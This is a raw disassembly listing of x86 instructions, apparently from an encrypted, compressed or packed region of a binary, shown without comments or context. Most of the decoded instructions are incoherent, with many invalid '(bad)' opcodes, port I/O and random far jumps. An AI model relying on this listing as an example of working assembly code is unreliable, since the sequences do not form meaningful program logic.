  418b8e:	adc    DWORD PTR [esi-0x4816bd86],ebx
  418b94:	loop   0x418b2e
  418b96:	jno    0x418be6
  418b98:	sbb    al,0x89
  418b9a:	in     al,dx
  418b9b:	mov    cl,0xc4
  418b9d:	cmp    al,0xa8
  418b9f:	int3   
  418ba0:	daa    
  418ba1:	xchg   edx,eax
  418ba2:	push   ecx
  418ba3:	push   0xb8f7565b
  418ba8:	cwde   
  418ba9:	jb     0x418c1c
  418bab:	mov    dh,0xfc
  418bad:	(bad)  
  418bae:	sbb    edi,DWORD PTR [edx-0x2bff7abb]
  418bb4:	push   es
  418bb5:	and    cl,BYTE PTR [edi+0x49]
  418bb8:	sahf   
  418bb9:	pop    edi
  418bba:	mov    ah,0x4a
  418bbc:	fidiv  DWORD PTR ds:0x89950db
  418bc2:	mov    dl,0xf8
  418bc4:	fcomp  QWORD PTR [eax+0x1b]
  418bc7:	aam    0xd4
  418bc9:	sub    DWORD PTR [esi-0x75],ebp
  418bcc:	popf   
  418bcd:	mov    esp,edx
  418bcf:	out    dx,eax
  418bd0:	data16 xor BYTE PTR [ecx-0x23],0x29
  418bd5:	jo     0x418c22
  418bd7:	pop    edx
  418bd8:	xor    eax,0x8ad3cb27
  418bdd:	loopne 0x418b95
  418bdf:	sbb    al,0x6d
  418be1:	jae    0x418c2f
  418be3:	popa   
  418be4:	(bad)  
  418be5:	scas   eax,DWORD PTR es:[edi]
  418be6:	mov    al,0x2
  418be8:	fcmovbe st,st(4)
  418bea:	fnstcw WORD PTR [edi]
  418bec:	or     ah,dh
  418bee:	add    esp,edx
  418bf0:	lock mov BYTE PTR [ebx],dh
  418bf3:	in     al,dx
  418bf4:	dec    ecx
  418bf5:	outs   dx,DWORD PTR ds:[esi]
  418bf6:	or     al,0x7
  418bf8:	mov    ebp,0xdacaf50b
  418bfd:	test   DWORD PTR ds:0xde6051,ebx
  418c03:	aam    0x5d
  418c05:	jne    0x418c14
  418c07:	ins    DWORD PTR es:[edi],dx
  418c08:	arpl   WORD PTR [ebx-0x80],bx
  418c0b:	jge    0x418be7
  418c0d:	imul   eax,DWORD PTR [ebp+0x35],0x87eba7c2
  418c14:	(bad)  
  418c15:	(bad)  
  418c16:	xor    al,0xb5
  418c18:	adc    esp,DWORD PTR [eax+0x5af5b9d4]
  418c1e:	ss call 0xd84fdfcb
  418c24:	cwde   
  418c25:	out    0x22,eax
  418c27:	cld    
  418c28:	aaa    
  418c29:	xchg   ebp,eax
  418c2a:	mov    edi,0xa5b4b0cc
  418c2f:	pop    ds
  418c30:	push   ecx
  418c31:	jae    0x418bc4
  418c33:	out    dx,al
  418c34:	xor    ah,BYTE PTR [ebx-0x366d48e4]
  418c3a:	shl    DWORD PTR [esi+0x1d2e9da2],1
  418c40:	mov    DWORD PTR [edx+0x24],ebp
  418c43:	xor    al,0x3d
  418c45:	inc    eax
  418c46:	jle    0x418c25
  418c48:	(bad)  
  418c49:	cwde   
  418c4a:	mov    edi,DWORD PTR [ecx+0x2f0926da]
  418c50:	pop    ebx
  418c51:	mov    dh,0x2b
  418c53:	inc    edx
  418c54:	fcmovb st,st(1)
  418c56:	cs popfw 
  418c59:	xor    eax,0xd68a86e4
  418c5e:	dec    ebp
  418c5f:	aaa    
  418c60:	test   BYTE PTR [edx-0x3c],al
  418c63:	bound  edi,QWORD PTR [edx]
  418c65:	ja     0x418cd8
  418c67:	mov    edi,0xa4bc81c9
  418c6c:	fucomip st,st(4)
  418c6e:	lods   al,BYTE PTR ds:[esi]
  418c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c70:	hlt    
  418c71:	add    al,0x3a
  418c73:	rol    DWORD PTR [ecx],1
  418c75:	mov    dl,0xb
  418c77:	and    BYTE PTR [ecx],dh
  418c79:	mov    WORD PTR [eax+0x74],gs
  418c7c:	jecxz  0x418cc3
  418c7e:	push   0x2d
  418c80:	sbb    BYTE PTR [eax+0x4],ch
  418c83:	push   cs
  418c84:	sbb    dl,BYTE PTR [esi]
  418c86:	imul   eax,DWORD PTR [esi+0xb],0x7fa087c4
  418c8d:	enter  0xa971,0xfa
  418c91:	fiadd  DWORD PTR [esp+eiz*2+0x6c]
  418c95:	fstp   QWORD PTR [ebp-0x14]
  418c98:	xlat   BYTE PTR ds:[ebx]
  418c99:	xor    DWORD PTR [ecx+0x77],0x2c1761f4
  418ca0:	add    edx,esi
  418ca2:	dec    ebp
  418ca3:	jo     0x418c6f
  418ca5:	pop    eax
  418ca6:	aad    0xbb
  418ca8:	add    al,0x7
  418caa:	jno    0x418c32
  418cac:	push   cs
  418cad:	inc    esp
  418cae:	push   ecx
  418caf:	gs scas eax,DWORD PTR es:[edi]
  418cb1:	jecxz  0x418cdf
  418cb3:	aam    0x16
  418cb5:	data16 ins BYTE PTR es:[edi],dx
  418cb7:	dec    edi
  418cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cb9:	scas   eax,DWORD PTR es:[edi]
  418cba:	inc    edx
  418cbb:	rcr    dl,1
  418cbd:	nop
  418cbe:	mov    ecx,0x243fdee2
  418cc3:	push   ebp
  418cc4:	(bad)  
  418cc5:	(bad)  
  418cc6:	pushf  
  418cc7:	and    eax,0xcdcfa98c
  418ccc:	sti    
  418ccd:	inc    ebp
  418cce:	push   ebp
  418ccf:	xor    al,0xe1
  418cd1:	jns    0x418cc9
  418cd3:	enter  0x24ce,0x1f
  418cd7:	push   esp
  418cd8:	sbb    eax,ebp
  418cda:	ret    0x3553
  418cdd:	(bad)  
  418cde:	pop    esi
  418cdf:	in     eax,dx
  418ce0:	xor    edx,DWORD PTR [edi+0x28fd04e7]
  418ce6:	push   ebp
  418ce7:	jbe    0x418cf0
  418ce9:	into   
  418cea:	stos   BYTE PTR es:[edi],al
  418ceb:	(bad)  
  418cec:	scas   al,BYTE PTR es:[edi]
  418ced:	mov    ebx,0x28b13240
  418cf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cf3:	and    al,cl
  418cf5:	mov    bh,0x6a
  418cf7:	in     eax,0xc1
  418cf9:	push   ss
  418cfa:	cmp    al,0x35
  418cfc:	aam    0x1c
  418cfe:	or     al,0x0
  418d00:	pop    esp
  418d01:	shl    dl,0x99
  418d04:	(bad)  
  418d06:	jge    0x418d43
  418d08:	dec    esi
  418d09:	dec    ebx
  418d0a:	sbb    al,0xb
  418d0c:	add    al,0xba
  418d0e:	pop    edi
  418d0f:	sar    DWORD PTR ds:0x88a76bd3,cl
  418d15:	mov    al,ds:0xdb794d79
  418d1a:	jo     0x418cd9
  418d1c:	push   es
  418d1d:	jnp    0x418cf9
  418d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d20:	dec    ebx
  418d21:	jns    0x418d02
  418d23:	rol    esi,cl
  418d25:	cdq    
  418d26:	inc    ecx
  418d27:	push   esp
  418d28:	pop    ss
  418d29:	jmp    0x418cb3
  418d2b:	xlat   BYTE PTR ds:[ebx]
  418d2c:	(bad)  
  418d2d:	inc    esi
  418d2e:	dec    ebp
  418d2f:	scas   al,BYTE PTR es:[edi]
  418d30:	xchg   edx,eax
  418d31:	sub    esi,DWORD PTR [ecx+0x49db3c42]
  418d37:	aam    0x84
  418d39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d3a:	ins    BYTE PTR es:[edi],dx
  418d3b:	sbb    eax,0xa81854b9
  418d40:	ficomp DWORD PTR [esi-0x80]
  418d43:	adc    cl,BYTE PTR [ebp+eax*2+0x39]
  418d47:	out    dx,eax
  418d48:	mov    cl,0xc8
  418d4a:	and    DWORD PTR [ecx-0x54],ebx
  418d4d:	xchg   esp,eax
  418d4e:	push   ecx
  418d4f:	clc    
  418d50:	push   ecx
  418d51:	push   0x6a
  418d53:	jmp    0x418d10
  418d55:	add    DWORD PTR [edi+edi*4+0x5a],esp
  418d59:	dec    BYTE PTR ds:0x1f42377a
  418d5f:	(bad)  
  418d60:	pusha  
  418d61:	xlat   BYTE PTR ds:[ebx]
  418d62:	add    DWORD PTR [ebx+0x1bc24efa],0x73717edd
  418d6c:	outs   dx,BYTE PTR ds:[esi]
  418d6d:	arpl   WORD PTR [edx],cx
  418d6f:	rcl    BYTE PTR [ecx+0x13d400d0],1
  418d75:	push   esp
  418d76:	popa   
  418d77:	pop    ebx
  418d78:	jg     0x418dad
  418d7a:	jo     0x418d2c
  418d7c:	fidiv  DWORD PTR [ebp-0x63]
  418d7f:	mov    ch,0x44
  418d81:	jno    0x418d92
  418d83:	add    bl,BYTE PTR [edx-0x249e8c2a]
  418d89:	and    ecx,DWORD PTR [ecx+0x71827f41]
  418d8f:	push   0x1894b8d5
  418d94:	or     DWORD PTR [edi],0xd6b65d45
  418d9a:	or     eax,0xef0e7a12
  418d9f:	mov    edi,0x657122c4
  418da4:	test   eax,0x54398668
  418da9:	fild   DWORD PTR [eax-0x2c]
  418dac:	and    edi,ebx
  418dae:	bound  eax,QWORD PTR [ebx-0x7e]
  418db1:	inc    esi
  418db2:	sbb    al,BYTE PTR [ebp-0x55450826]
  418db8:	xchg   ebx,eax
  418db9:	push   edx
  418dba:	js     0x418d43
  418dbc:	push   ebp
  418dbd:	(bad)  
  418dbe:	cmc    
  418dbf:	cmp    ebx,DWORD PTR [esp+eiz*4+0x268d9530]
  418dc6:	jno    0x418d67
  418dc8:	sbb    al,BYTE PTR [edx+0x450c795a]
  418dce:	lock shr DWORD PTR [edi+ebp*2],1
  418dd2:	adc    ebp,ebx
  418dd4:	jle    0x418e4b
  418dd6:	xchg   ecx,eax
  418dd7:	frstor [edx+0x69cc71be]
  418ddd:	addr16 mov eax,ds:0x2d98
  418de1:	adc    cl,BYTE PTR [ebp+edx*2-0x2f4aa4f4]
  418de8:	neg    BYTE PTR gs:[esi+edx*2]
  418dec:	cmp    esp,DWORD PTR [bx+di+0x2f29]
  418df1:	xor    DWORD PTR [esp+edx*1],0xe645565d
  418df8:	mov    ebp,0xcc85afe2
  418dfd:	(bad)  
  418dfe:	and    eax,0xe7427fe5
  418e03:	aaa    
  418e04:	lahf   
  418e05:	addr16 jno 0x418e1e
  418e08:	ror    DWORD PTR [edi],1
  418e0a:	test   eax,0x73dc291
  418e0f:	fimul  WORD PTR [ebp+0xcd310e8]
  418e15:	rcl    BYTE PTR [edx-0x189a1501],cl
  418e1b:	jae    0x418e45
  418e1d:	sub    eax,0x4f36b471
  418e22:	mov    ch,0x31
  418e24:	in     al,0xa5
  418e26:	test   bl,dl
  418e28:	repz mov eax,ds:0xd917f7af
  418e2e:	pop    ebx
  418e2f:	mov    ch,0xda
  418e31:	fst    st(5)
  418e33:	(bad)  
  418e35:	fcomip st,st(4)
  418e37:	mov    BYTE PTR [edx],al
  418e39:	(bad)  
  418e3a:	int3   
  418e3b:	jbe    0x418e9a
  418e3d:	mov    al,0xf9
  418e3f:	(bad)  
  418e40:	stc    
  418e41:	mov    al,0xe1
  418e43:	std    
  418e44:	ficom  DWORD PTR [eax]
  418e46:	add    cl,BYTE PTR [ecx]
  418e48:	test   al,0x8c
  418e4a:	lods   al,BYTE PTR ds:[esi]
  418e4b:	jns    0x418ea5
  418e4d:	(bad)  
  418e4e:	add    eax,0x866bdd82
  418e53:	sbb    BYTE PTR [ecx],ch
  418e55:	xor    al,0x71
  418e57:	add    ch,BYTE PTR [ebx]
  418e59:	(bad)
  418e5d:	dec    eax
  418e5e:	mov    ebx,ss
  418e60:	xor    eax,0xd5a74055
  418e65:	int3   
  418e66:	adc    ah,BYTE PTR [esi-0x26]
  418e69:	xchg   ebx,eax
  418e6a:	inc    ebx
  418e6b:	sbb    eax,0x611bd712
  418e70:	xor    ebx,DWORD PTR [edx+0x5f]
  418e73:	aam    0xf2
  418e75:	les    ebx,FWORD PTR [ebx]
  418e77:	enter  0x8c6d,0x6a
  418e7b:	jae    0x418e57
  418e7d:	mov    dl,0x5
  418e7f:	or     al,0x2e
  418e81:	sahf   
  418e82:	stos   BYTE PTR es:[edi],al
  418e83:	out    dx,al
  418e84:	mov    edx,0x70f028d6
  418e89:	or     eax,0xafc0d7b
  418e8e:	outs   dx,BYTE PTR ds:[esi]
  418e8f:	ja     0x418e3d
  418e91:	push   esp
  418e92:	dec    eax
  418e93:	(bad)  
  418e94:	xor    eax,0xa077d0e6
  418e99:	mov    esi,0x2e6f04a1
  418e9e:	mov    ah,0xc3
  418ea0:	mov    esp,0x9a3c45d2
  418ea5:	test   DWORD PTR [ecx+edi*2],esp
  418ea8:	push   es
  418ea9:	sahf   
  418eaa:	xchg   edi,ebp
  418eac:	push   ecx
  418ead:	(bad)  
  418eae:	jle    0x418ee7
  418eb0:	inc    esp
  418eb1:	push   es
  418eb2:	sub    al,ah
  418eb4:	data16 out 0x5e,al
  418eb7:	and    DWORD PTR [ecx+0x48cf7035],ebx
  418ebd:	mov    ds:0x21f2afbf,al
  418ec2:	lds    ebp,FWORD PTR es:[edx+0x27]
  418ec6:	in     al,dx
  418ec7:	scas   al,BYTE PTR es:[edi]
  418ec8:	call   0x54d7:0xc83a529
  418ecf:	dec    esi
  418ed0:	(bad)  
  418ed2:	xchg   esp,eax
  418ed3:	cs (bad) 
  418ed5:	jmp    0x418f56
  418ed7:	sar    DWORD PTR [eax],cl
  418ed9:	mov    BYTE PTR [ebp+0x20],ch
  418edc:	and    DWORD PTR [edx+0x1f],0xffffffd4
  418ee0:	sbb    eax,0xfb34af80
  418ee5:	aam    0xc0
  418ee7:	xchg   esp,eax
  418ee8:	les    ebp,FWORD PTR [ecx-0x4625656b]
  418eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eef:	mov    ch,0xd0
  418ef1:	or     al,0xb8
  418ef3:	shr    DWORD PTR [esi+edi*4],cl
  418ef6:	xchg   edx,eax
  418ef7:	aam    0x1e
  418ef9:	push   ebx
  418efa:	cmp    eax,0x669c2252
  418eff:	adc    eax,0xf3c1c103
  418f04:	and    bl,dh
  418f06:	dec    edi
  418f07:	aam    0xff
  418f09:	ror    DWORD PTR [ebp+0x75da55a2],0xc1
  418f10:	test   BYTE PTR ds:0xaee6c66a,0x1f
  418f17:	test   al,0xfb
  418f19:	je     0x418f3f
  418f1b:	shr    edi,1
  418f1d:	test   BYTE PTR [eax-0x5b29f3ae],0xf1
  418f24:	mov    ds:0xbd162d33,eax
  418f29:	pop    esi
  418f2a:	push   0xffffffb5
  418f2c:	lods   eax,DWORD PTR ds:[esi]
  418f2d:	aaa    
  418f2e:	jg     0x418eb3
  418f30:	stos   BYTE PTR es:[edi],al
  418f31:	stos   BYTE PTR es:[edi],al
  418f32:	addr16 imul ecx,ebp,0xffffffd1
  418f36:	cmp    al,al
  418f38:	int3   
  418f39:	popf   
  418f3a:	mov    dh,0xd3
  418f3c:	dec    esi
  418f3d:	push   ss
  418f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f3f:	mov    ch,0x8e
  418f41:	jno    0x418fb4
  418f43:	xlat   BYTE PTR ds:[ebx]
  418f44:	icebp  
  418f45:	mov    dl,0x44
  418f47:	test   DWORD PTR [edx],0x8cd38fc0
  418f4d:	cmp    DWORD PTR [ebx-0x215d4736],0x71602a19
  418f57:	or     edi,ebx
  418f59:	xchg   ecx,eax
  418f5a:	or     al,0x5f
  418f5c:	adc    eax,0x81b4d512
  418f61:	fistp  DWORD PTR [esi+0x1b9ac3d3]
  418f67:	out    dx,eax
  418f68:	mov    ah,dl
  418f6a:	jo     0x418fd2
  418f6c:	cli    
  418f6d:	sbb    ah,BYTE PTR [esi+0x26]
  418f70:	sti    
  418f71:	pop    ebx
  418f72:	pop    ebp
  418f73:	aam    0x2b
  418f75:	sub    ch,bh
  418f77:	dec    ebx
  418f78:	aas    
  418f79:	fld    QWORD PTR [eax-0x4707256a]
  418f7f:	or     ch,BYTE PTR [eax+ebx*4-0x23]
  418f83:	ficomp WORD PTR [ecx-0x5d5c443d]
  418f89:	(bad)  
  418f8a:	jl     0x418f8e
  418f8c:	enter  0x7f21,0x94
  418f90:	fiadd  DWORD PTR [ebp-0x16]
  418f93:	ret    
  418f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f95:	ror    DWORD PTR [edi+0x64d362fe],cl
  418f9b:	ret    
  418f9c:	xchg   BYTE PTR [edx-0x1dc5b537],ah
  418fa2:	sbb    ebp,ebp
  418fa4:	retf   
  418fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fa6:	cmp    DWORD PTR [ebx+0x424a161d],ecx
  418fac:	sbb    DWORD PTR [edx+edi*2-0x3cb3712d],ecx
  418fb3:	xor    al,0x55
  418fb5:	imul   ebx,DWORD PTR [eax],0xffffffc1
  418fb8:	ret    0x1e75
  418fbb:	push   edx
  418fbc:	data16 outs dx,BYTE PTR ds:[esi]
  418fbe:	test   DWORD PTR [ebp-0x6b9a72fe],esi
  418fc4:	add    BYTE PTR [eax+0x77a4f94d],bl
  418fca:	outs   dx,BYTE PTR ds:[esi]
  418fcb:	cdq    
  418fcc:	and    DWORD PTR [esi],eax
  418fce:	jo     0x41900f
  418fd0:	jns    0x418fa8
  418fd2:	or     eax,0xcd76b8ba
  418fd7:	jbe    0x418fdf
  418fd9:	push   ebp
  418fda:	jno    0x418f79
  418fdc:	xor    bh,dh
  418fde:	sub    dh,BYTE PTR [ebp+0x4]
  418fe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe2:	jl     0x418fb7
  418fe4:	out    0xb8,al
  418fe6:	pusha  
  418fe7:	retf   0xeda0
  418fea:	cmp    dl,0xda
  418fed:	enter  0x8509,0x5a
  418ff1:	mov    esi,0xd51588fa
  418ff6:	pop    ebx
  418ff7:	in     eax,0x45
  418ff9:	ja     0x418fe0
  418ffb:	and    BYTE PTR [eax-0x2ce5b612],0x51
  419002:	scas   al,BYTE PTR es:[edi]
  419003:	idiv   BYTE PTR [eax+edx*4-0x1f]
  419007:	call   0xd624:0xe40b672a
  41900e:	or     BYTE PTR [ecx-0x45],ah
  419011:	mov    ecx,DWORD PTR [ebp+0x717ef507]
  419017:	cmp    DWORD PTR [eax+0x3348836b],ecx
  41901d:	jnp    0x41903b
  41901f:	call   0x1fa3:0x846a0d5c
  419026:	adc    al,0xe4
  419028:	mov    al,ds:0xda5ce273
  41902d:	mov    eax,ds:0x9f57c66
  419032:	cdq    
  419033:	inc    ebx
  419034:	adc    al,0xd6
  419036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419037:	xor    edi,DWORD PTR [edx-0x5d]
  41903a:	lods   al,BYTE PTR ds:[esi]
  41903b:	dec    edx
  41903c:	and    cl,al
  41903e:	ins    BYTE PTR es:[edi],dx
  41903f:	mov    DWORD PTR [ebx+0x5a6762b9],esp
  419045:	rcl    ah,0xe0
  419048:	iret   
  419049:	(bad)  
  41904a:	loop   0x41908d
  41904c:	idiv   BYTE PTR [ebp-0x7]
  41904f:	cmp    bl,BYTE PTR [edi-0x6c359df4]
  419055:	out    0x67,al
  419057:	aam    0xb4
  419059:	cmc    
  41905a:	xor    DWORD PTR [eax+0x46],ebx
  41905d:	(bad)  
  41905e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41905f:	outs   dx,DWORD PTR ds:[esi]
  419060:	add    ch,BYTE PTR [edx+0x63]
  419063:	add    eax,eax
  419065:	jns    0x4190d8
  419067:	sub    BYTE PTR ds:0x84bfe2dd,dl
  41906d:	jle    0x4190a9
  41906f:	clc    
  419070:	sub    dl,dh
  419072:	retf   
  419073:	fnsave [ebp-0x638145b3]
  419079:	pusha  
  41907a:	aam    0x9a
  41907c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41907d:	push   esi
  41907e:	add    DWORD PTR [ecx],eax
  419080:	dec    ebp
  419081:	cwde   
  419082:	aad    0x17
  419084:	dec    edi
  419085:	(bad)  
  419086:	pop    es
  419087:	lds    esp,FWORD PTR [eax-0x321caaa2]
  41908d:	in     al,0x70
  41908f:	or     al,0xee
  419091:	jge    0x419075
  419093:	leave  
  419094:	stc    
  419095:	sub    ch,ah
  419097:	shl    edx,cl
  419099:	xchg   ecx,eax
  41909a:	fcmovnb st,st(7)
  41909c:	fs gs cmp ah,0xda
  4190a1:	sbb    DWORD PTR [ecx+eax*8-0x4c54133e],eax
  4190a8:	mov    dl,0xd6
  4190aa:	xor    al,0x86
  4190ac:	dec    edi
  4190ad:	mov    ebp,0x7134e65a
  4190b2:	inc    ebp
  4190b3:	ins    BYTE PTR es:[edi],dx
  4190b4:	dec    esi
  4190b5:	push   0x6a
  4190b7:	push   0x59
  4190b9:	dec    eax
  4190ba:	mov    cl,0xfc
  4190bc:	stc    
  4190bd:	add    bh,BYTE PTR [esi+0x23]
  4190c0:	(bad)  
  4190c1:	(bad)  
  4190c2:	xor    BYTE PTR ds:0xe2c94c33,al
  4190c8:	gs jmp 0x3901ef3e
  4190ce:	scas   eax,DWORD PTR es:[edi]
  4190cf:	(bad)  
  4190d0:	test   ah,dl
  4190d2:	sub    ch,al
  4190d4:	dec    esi
  4190d5:	mov    bl,0x66
  4190d7:	test   eax,0xa1f1bdeb
  4190dc:	les    ecx,FWORD PTR [ebp+0x53]
  4190df:	pop    eax
  4190e0:	retf   
  4190e1:	mov    BYTE PTR [eax-0x4589cd2b],ah
  4190e7:	or     eax,0xd3df785f
  4190ec:	cmp    edx,ebx
  4190ee:	jnp    0x4190cf
  4190f0:	mov    ch,0x9b
  4190f2:	iret   
  4190f3:	mov    esp,0x3a7113f6
  4190f8:	jae    0x4190ea
  4190fa:	gs push esi
  4190fc:	push   ebp
  4190fd:	sub    eax,0xf12e9a92
  419102:	out    dx,eax
  419103:	ds ffreep st(7)
  419106:	pop    eax
  419107:	add    ecx,DWORD PTR [ebx-0x33d13626]
  41910d:	xchg   ebx,eax
  41910e:	and    eax,DWORD PTR [edx+eiz*2]
  419111:	mov    dh,0x85
  419113:	dec    esp
  419114:	arpl   WORD PTR [ecx],cx
  419116:	xor    bl,BYTE PTR [eax+0x15f137f9]
  41911c:	(bad)  
  41911e:	mov    eax,DWORD PTR [ecx-0x31]
  419121:	cmp    eax,0x2df3e36a
  419126:	mov    ebx,0x7dfa1a24
  41912b:	cs pop ebp
  41912d:	mov    eax,0x9628ccbe
  419132:	loope  0x419156
  419134:	and    BYTE PTR [edi+0x7fda9c56],ch
  41913a:	mov    ds:0xc0e7ce5b,al
  41913f:	pop    es
  419140:	(bad)  
  419141:	(bad)  
  419142:	adc    eax,0x456b9ff0
  419147:	and    ch,dh
  419149:	push   cs
  41914a:	xor    edx,DWORD PTR [ebp+0x4]
  41914d:	enter  0x8949,0x4c
  419151:	mul    BYTE PTR [edx-0x7e]
  419154:	add    DWORD PTR [ecx-0x37],0xffffffd3
  419158:	inc    esp
  419159:	outs   dx,DWORD PTR ds:[esi]
  41915a:	repz sbb dh,BYTE PTR gs:[edi+0x73da3095]
  419162:	loope  0x419168
  419164:	aas    
  419165:	jmp    0xded3:0xb77dece2
  41916c:	mov    ecx,0x264c6ddb
  419171:	or     ecx,0x24
  419174:	cmp    ch,BYTE PTR [edi+ebx*8]
  419177:	lods   al,BYTE PTR ds:[esi]
  419178:	fisubr DWORD PTR [eax+0x2d]
  41917b:	push   edx
  41917c:	jecxz  0x419198
  41917e:	int3   
  41917f:	pop    esp
  419180:	cmp    edx,ebp
  419182:	pop    ebp
  419183:	pop    edx
  419184:	push   ds
  419185:	leave  
  419186:	iret   
  419187:	loope  0x41912d
  419189:	push   esi
  41918a:	lahf   
  41918b:	mov    bl,0xab
  41918d:	out    0xe6,eax
  41918f:	ja     0x419136
  419191:	pop    ebx
  419192:	mov    ss,ebx
  419194:	cmp    ecx,DWORD PTR [esi+eax*1-0x1fc75202]
  41919b:	fsub   QWORD PTR [ebp+0x23]
  41919e:	jno    0x419131
  4191a0:	xchg   edx,eax
  4191a1:	inc    edi
  4191a2:	and    ch,BYTE PTR [edi]
  4191a4:	mov    edi,0xb9968a53
  4191a9:	mov    al,0xf1
  4191ab:	pop    edx
  4191ac:	(bad)  [ecx]
  4191ae:	jne    0x419202
  4191b0:	jmp    0xdc91:0xe8d071b2
  4191b7:	icebp  
  4191b8:	arpl   WORD PTR [ecx+0x5],di
  4191bb:	rcr    DWORD PTR ds:0x8e9ca199,1
  4191c1:	sub    ch,BYTE PTR [ecx+0x71ba8a44]
  4191c7:	and    eax,0x1f31d4cc
  4191cc:	int    0x76
  4191ce:	hlt    
  4191cf:	lds    esi,FWORD PTR [edx]
  4191d1:	mov    dl,0xa6
  4191d3:	aas    
  4191d4:	fidiv  DWORD PTR [edx+ebp*4+0x534b0261]
  4191db:	nop
  4191dc:	loopne 0x4191b2
  4191de:	mov    cl,0xa4
  4191e0:	cmp    al,0x89
  4191e2:	xchg   BYTE PTR [ebx+0x18],bl
  4191e5:	xchg   edi,eax
  4191e6:	les    eax,FWORD PTR [esi+0x53]
  4191e9:	push   cs
  4191ea:	inc    esi
  4191eb:	hlt    
  4191ec:	fsub   st,st(6)
  4191ee:	iret   
  4191ef:	sbb    DWORD PTR [ebx+0x36],0x6a
  4191f3:	and    bl,0xdb
  4191f6:	(bad)  
  4191f7:	mov    WORD PTR [edx+0x3e38e768],gs
  4191fd:	(bad)  
  4191fe:	pop    ss
  4191ff:	cs enter 0xe888,0xf5
  419204:	adc    cl,BYTE PTR [eax]
  419206:	jno    0x4191be
  419208:	mov    ch,0xe8
  41920a:	sbb    eax,DWORD PTR [eax-0x63]
  41920d:	mov    al,ds:0xc677d3c7
  419212:	adc    al,0xf
  419214:	outs   dx,DWORD PTR ds:[esi]
  419215:	jp     0x41925c
  419217:	in     eax,0xda
  419219:	xchg   edi,eax
  41921a:	cmp    BYTE PTR [ebp+edi*1+0x7c],ah
  41921e:	int    0xf6
  419220:	push   es
  419221:	aam    0x36
  419223:	sbb    BYTE PTR [edx-0x6d],bh
  419226:	dec    eax
  419227:	sub    DWORD PTR [edx],ebx
  419229:	aad    0x41
  41922b:	das    
  41922c:	fnstenv [edi+ebx*1+0x3a]
  419230:	ja     0x4191db
  419232:	lahf   
  419233:	xchg   edi,eax
  419234:	add    dl,BYTE PTR [edi+0x7d]
  419237:	shl    edi,cl
  419239:	xor    DWORD PTR [ebx],eax
  41923b:	mov    ch,0x1d
  41923d:	fucom  st(1)
  41923f:	retf   
  419240:	mov    ebp,0x5a840108
  419245:	adc    ah,BYTE PTR [esp+edi*2]
  419248:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419249:	call   0x5984:0xbfe2d3c7
  419250:	and    bl,0x41
  419253:	rcl    ch,1
  419255:	adc    al,cl
  419257:	outs   dx,DWORD PTR ds:[esi]
  419258:	lahf   
  419259:	mov    dh,0xb1
  41925b:	mov    bl,0x28
  41925d:	add    bl,bl
  41925f:	rcr    DWORD PTR [esi+0x2506034a],cl
  419265:	jne    0x41924e
  419267:	rcr    edx,0x4d
  41926a:	bound  edx,QWORD PTR ds:0x6ab96b2f
  419270:	inc    edx
  419271:	(bad)  
  419272:	cmp    ebp,edx
  419274:	scas   eax,DWORD PTR es:[edi]
  419275:	pop    ebx
  419276:	mov    dh,0x8f
  419278:	fsub   DWORD PTR [esi]
  41927a:	jno    0x4192ab
  41927c:	pop    es
  41927d:	push   esi
  41927e:	in     al,dx
  41927f:	bound  ecx,QWORD PTR [edx]
  419281:	xor    eax,0xc903d385
  419286:	and    eax,0x56aeae56
  41928b:	jae    0x419267
  41928d:	icebp  
  41928e:	inc    edx
  41928f:	mov    ?,WORD PTR [ebx+0x5ff647d9]
  419295:	(bad)  
  419296:	and    DWORD PTR [edi+eiz*8+0x6a],esi
  41929a:	cdq    
  41929b:	nop
  41929c:	jge    0x419236
  41929e:	and    eax,0xd6d68155
  4192a3:	mov    ebp,ebx
  4192a5:	jo     0x4192e7
  4192a7:	fbstp  TBYTE PTR [esi-0x48]
  4192aa:	push   ebp
  4192ab:	inc    ebp
  4192ac:	ins    DWORD PTR es:[edi],dx
  4192ad:	push   ss
  4192ae:	pop    ebx
  4192af:	mov    edx,?
  4192b1:	pop    ss
  4192b2:	js     0x419234
  4192b4:	fidiv  DWORD PTR [edi]
  4192b6:	pop    es
  4192b7:	mov    edx,0x30324a73
  4192bc:	xchg   di,ax
  4192be:	out    dx,al
  4192bf:	inc    esi
  4192c0:	fidiv  DWORD PTR [ebx]
  4192c2:	xchg   ebx,eax
  4192c3:	fwait
  4192c4:	sub    eax,0xdae1cb89
  4192c9:	call   0xc9d4:0x4247717b
  4192d0:	ficomp WORD PTR [edx+0x155a4cab]
  4192d6:	mov    cl,0x2f
  4192d8:	pop    esi
  4192d9:	out    0xea,eax
  4192db:	ret    
  4192dc:	fidivr DWORD PTR [ecx+0x48e026ed]
  4192e2:	sti    
  4192e3:	and    DWORD PTR [ebx-0x2a],edi
  4192e6:	arpl   WORD PTR [ebx],cx
  4192e8:	xor    BYTE PTR [ebp+0x57],ch
  4192eb:	adc    BYTE PTR [edx],ah
  4192ed:	cld    
  4192ee:	jo     0x4192dc
  4192f0:	pop    edx
  4192f1:	pop    eax
  4192f2:	add    DWORD PTR [ebx+0x6],edx
  4192f5:	add    DWORD PTR [ebx],esp
  4192f7:	lds    ebx,FWORD PTR [ebp+0x7a33375a]
  4192fd:	cmp    ebp,esp
  4192ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419300:	inc    ecx
  419301:	sub    al,0x71
  419303:	test   al,al
  419305:	js     0x51bc41e1
  41930b:	aam    0xbf
  41930d:	outs   dx,BYTE PTR ds:[esi]
  41930e:	adc    ch,ch
  419310:	dec    ebx
  419311:	cli    
  419312:	nop
  419313:	fidiv  WORD PTR [esi-0x25fdfd5a]
  419319:	mov    ebp,0x187c1c2e
